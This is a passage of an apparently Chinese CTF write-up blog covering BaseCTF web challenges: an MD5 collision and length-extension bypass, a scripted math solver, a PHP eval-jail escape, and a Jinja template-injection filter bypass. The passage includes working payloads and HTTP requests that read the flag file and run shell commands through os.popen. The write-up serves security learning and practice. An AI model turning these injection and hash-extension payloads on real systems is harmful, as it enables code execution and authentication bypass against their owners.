</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=p>((</span><span class=nx>string</span><span class=p>)</span><span class=nv>$apple</span> <span class=o>!==</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=nv>$banana</span> <span class=o>&amp;&amp;</span> <span class=nx>md5</span><span class=p>((</span><span class=nx>string</span><span class=p>)</span><span class=nv>$apple</span><span class=p>)</span> <span class=o>===</span> <span class=nx>md5</span><span class=p>((</span><span class=nx>string</span><span class=p>)</span><span class=nv>$banana</span><span class=p>)))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;嘻嘻, 不会了? 没看直播回放?&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 你以为这就结束了
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;random&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;random&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nx>bin2hex</span><span class=p>(</span><span class=nx>random_bytes</span><span class=p>(</span><span class=mi>16</span><span class=p>))</span> <span class=o>.</span> <span class=nx>bin2hex</span><span class=p>(</span><span class=nx>random_bytes</span><span class=p>(</span><span class=mi>16</span><span class=p>))</span> <span class=o>.</span> <span class=nx>bin2hex</span><span class=p>(</span><span class=nx>random_bytes</span><span class=p>(</span><span class=mi>16</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 你想看到 random 的值吗?
</span></span></span><span class=line><span class=cl><span class=c1>// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$random</span> <span class=o>=</span> <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;random&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$random</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s1>&#39;&lt;br /&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$name</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>]</span> <span class=o>??</span> <span class=s1>&#39;user&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// check if name ends with &#39;admin&#39;
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$name</span><span class=p>,</span> <span class=o>-</span><span class=mi>5</span><span class=p>)</span> <span class=o>!==</span> <span class=s1>&#39;admin&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;不是管理员也来凑热闹?&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$md5</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;md5&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$random</span> <span class=o>.</span> <span class=nv>$name</span><span class=p>)</span> <span class=o>!==</span> <span class=nv>$md5</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;伪造? NO NO NO!&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 认输了, 看样子你真的很懂 MD5
</span></span></span><span class=line><span class=cl><span class=c1>// 那 flag 就给你吧
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>echo</span> <span class=s2>&#34;看样子你真的很懂 MD5&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;/flag&#39;</span><span class=p>);</span> 
</span></span></code></pre></td></tr></table></div></div><p>md5绕过而且很全面</p><p>主要说说长度扩展的怎么打</p><p>基本原理就是本来是自带四个幻数，但是如果我中间进行md5 block的填充，我就可以插入数据更新幻数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>bin2hex</span><span class=p>(</span><span class=nx>random_bytes</span><span class=p>(</span><span class=mi>16</span><span class=p>))</span> <span class=o>.</span> <span class=nx>bin2hex</span><span class=p>(</span><span class=nx>random_bytes</span><span class=p>(</span><span class=mi>16</span><span class=p>))</span> <span class=o>.</span> <span class=nx>bin2hex</span><span class=p>(</span><span class=nx>random_bytes</span><span class=p>(</span><span class=mi>16</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=s1>&#39;519b5b1fdf52180319049cb85ed650767688949e246f862d954c5f1929229e1f5e28d5a34d3157c21aeb14300de5c526&#39;</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p>得到是<code>96</code>位</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>└─$ python hash_ext_attack.py
</span></span><span class=line><span class=cl>2024-09-16 11:11:59.952 | DEBUG    | common.md5_manual:__init__:17 - init......
</span></span><span class=line><span class=cl>请输入已知明文：
</span></span><span class=line><span class=cl>请输入已知hash： aabb626e2ad043682bc9a07157826adf
</span></span><span class=line><span class=cl>请输入扩展字符: admin
</span></span><span class=line><span class=cl>请输入密钥长度：96
</span></span><span class=line><span class=cl>2024-09-16 11:12:17.215 | INFO     | common.HashExtAttack:run:65 - 已知明文：b&#39;&#39;
</span></span><span class=line><span class=cl>2024-09-16 11:12:17.215 | INFO     | common.HashExtAttack:run:66 - 已知hash：b&#39;aabb626e2ad043682bc9a07157826adf&#39;
</span></span><span class=line><span class=cl>2024-09-16 11:12:17.215 | INFO     | common.HashExtAttack:run:68 - 新明文：b&#39;\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00admin&#39;
</span></span><span class=line><span class=cl>2024-09-16 11:12:17.216 | INFO     | common.HashExtAttack:run:69 - 新明文(url编码)：%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%03%00%00%00%00%00%00admin
</span></span><span class=line><span class=cl>2024-09-16 11:12:17.216 | INFO     | common.HashExtAttack:run:71 - 新hash:d1c4ed2f942ffa9e7737bc93fc4eed4a
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Request:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>POST / HTTP/1.1
</span></span><span class=line><span class=cl>Host: challenge.basectf.fun:35350
</span></span><span class=line><span class=cl>Cache-Control: max-age=0
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
</span></span><span class=line><span class=cl>Cookie: PHPSESSID=9c14647va91fmsku06lsevlmij
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
</span></span><span class=line><span class=cl>Content-Length: 807
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>apple[]=1&amp;banana[]=2&amp;appple=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;bananana=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&amp;apppple=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;banananana=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&amp;md5=d1c4ed2f942ffa9e7737bc93fc4eed4a&amp;name=%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%03%00%00%00%00%00%00admin
</span></span></code></pre></td></tr></table></div></div><p>中途出现了点插曲因为这里<code>hashpump</code>是无法使用了的于是换了一个脚本，服了，我觉得这个原理有必要研究一下并且自己写个脚本</p><h2 id=week2-数学大师>[Week2] 数学大师</h2><p><code>https://regex101.com/</code>找到一个正则网站可以的好用</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sess</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>session</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1># 修正正则表达式，匹配运算符 +, -, ×, ÷</span>
</span></span><span class=line><span class=cl><span class=n>reg</span> <span class=o>=</span> <span class=sa>r</span><span class=s2>&#34;(\d+)\s*([\+\-\×\÷])\s*(\d+)&#34;</span>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://challenge.basectf.fun:48234/&#34;</span>
</span></span><span class=line><span class=cl><span class=n>answer</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># 提交答案</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>sess</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;answer&#39;</span><span class=p>:</span> <span class=n>answer</span><span class=p>})</span>
</span></span><span class=line><span class=cl>    <span class=c1># 匹配题目内容</span>
</span></span><span class=line><span class=cl>    <span class=k>match</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>reg</span><span class=p>,</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># 检查匹配是否成功</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=k>match</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>num1</span> <span class=o>=</span> <span class=k>match</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>op</span> <span class=o>=</span> <span class=k>match</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>num2</span> <span class=o>=</span> <span class=k>match</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># 根据运算符计算答案</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>op</span> <span class=o>==</span> <span class=s2>&#34;+&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>answer</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>num1</span><span class=p>)</span> <span class=o>+</span> <span class=nb>int</span><span class=p>(</span><span class=n>num2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>op</span> <span class=o>==</span> <span class=s2>&#34;-&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>answer</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>num1</span><span class=p>)</span> <span class=o>-</span> <span class=nb>int</span><span class=p>(</span><span class=n>num2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>op</span> <span class=o>==</span> <span class=s2>&#34;×&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>answer</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>num1</span><span class=p>)</span> <span class=o>*</span> <span class=nb>int</span><span class=p>(</span><span class=n>num2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>op</span> <span class=o>==</span> <span class=s2>&#34;÷&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>answer</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>num1</span><span class=p>)</span> <span class=o>//</span> <span class=nb>int</span><span class=p>(</span><span class=n>num2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;未找到匹配的题目，可能是最后一题或者发生了错误。&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 输出服务器响应内容</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># 判断是否完成挑战</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;Base&#34;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;挑战完成!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># 等待 0.5 秒以防请求过快</span>
</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.5</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=week3-ez_php_jail>[Week3] ez_php_jail</h2><p>在 <strong>PHP 8 之前</strong> 的版本中，当参数名中含有 <code>.</code>（点号）或者<code>[</code>(左括号)时，会被自动转为 <strong><code>_</code>（下划线）</strong>。如果<code>[</code>出现在参数中使得错误转换导致接下来如果该参数名中还有<code>非法字符</code>并不会继续转换成下划线<code>_</code>，但是如果参数最后出现了<code>]</code>,那么其中的非法字符还是会被正常解析(不会转换)，因为被当成了数组</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>include</span><span class=p>(</span><span class=s2>&#34;hint.html&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$Jail</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;Jail_by.Happy&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$Jail</span> <span class=o>==</span> <span class=k>null</span><span class=p>)</span> <span class=k>die</span><span class=p>(</span><span class=s2>&#34;Do You Like My Jail?&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>Like_Jail</span><span class=p>(</span><span class=nv>$var</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/(`|\$|a|c|s|require|include)/i&#39;</span><span class=p>,</span> <span class=nv>$var</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>Like_Jail</span><span class=p>(</span><span class=nv>$Jail</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>eval</span><span class=p>(</span><span class=nv>$Jail</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;Yes! you escaped from the jail! LOL!&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;You will Jail in your life!&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 在HTML解析后再输出PHP源代码
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>但是查看文件这里又有一些绕过</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?Jail[by.Happy=highlight_file(glob(&#39;/f*&#39;)[0]);
</span></span></code></pre></td></tr></table></div></div><p>使用<code>glob</code>函数查找</p><h2 id=week3-复读机>[Week3] 复读机</h2><p>这里其实是有点没看懂在干嘛的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>BaseCTF{}{4/4}
</span></span></code></pre></td></tr></table></div></div><p>这样子才看出来是有过滤的，服了这过滤把<code>fenjing</code>办了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /flag HTTP/1.1
</span></span><span class=line><span class=cl>Host: challenge.basectf.fun:47686
</span></span><span class=line><span class=cl>Content-Length: 260
</span></span><span class=line><span class=cl>Pragma: no-cache
</span></span><span class=line><span class=cl>Cache-Control: no-cache
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>Origin: http://challenge.basectf.fun:47686
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span></span><span class=line><span class=cl>Referer: http://challenge.basectf.fun:47686/flag
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
</span></span><span class=line><span class=cl>Cookie: PHPSESSID=9c14647va91fmsku06lsevlmij
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>flag=Basectf{}{%set gl=&#39;_&#39;~&#39;_&#39;~&#39;g&#39;&#39;lobals&#39;~&#39;_&#39;~&#39;_&#39;%}{%set bu=&#39;_&#39;~&#39;_&#39;~&#39;b&#39;&#39;uiltins&#39;~&#39;_&#39;~&#39;_&#39;%}{%set im=&#39;_&#39;~&#39;_&#39;~&#39;import&#39;~&#39;_&#39;~&#39;_&#39;%}{%set vs=&#39;OS&#39;|lower%}{%set ca=&#39;%c%c%c%c%c%c%c&#39;%(99,97,116,32,47,102,42)%}{%print g[&#39;p&#39;&#39;op&#39;][gl][bu][im](vs)[&#39;p&#39;&#39;open&#39;](ca)[&#39;read&#39;]()%}
</span></span></code></pre></td></tr></table></div></div><p>最后搞了老半天，不好绕</p><h2 id=week3-滤个不停>[Week3] 滤个不停</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$incompetent</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;incompetent&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$Datch</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;Datch&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nv>$incompetent</span> <span class=o>!==</span> <span class=s1>&#39;HelloWorld&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;写出程序员的第一行问候吧！&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>//这是个什么东东？？？
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$required_chars</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;s&#39;</span><span class=p>,</span> <span class=s1>&#39;e&#39;</span><span class=p>,</span> <span class=s1>&#39;v&#39;</span><span class=p>,</span> <span class=s1>&#39;a&#39;</span><span class=p>,</span> <span class=s1>&#39;n&#39;</span><span class=p>,</span> <span class=s1>&#39;x&#39;</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>,</span> <span class=s1>&#39;o&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$is_valid</span> <span class=o>=</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>foreach</span> <span class=p>(</span><span class=nv>$required_chars</span> <span class=k>as</span> <span class=nv>$char</span><span class=p>)</span> <span class=p>{</span>
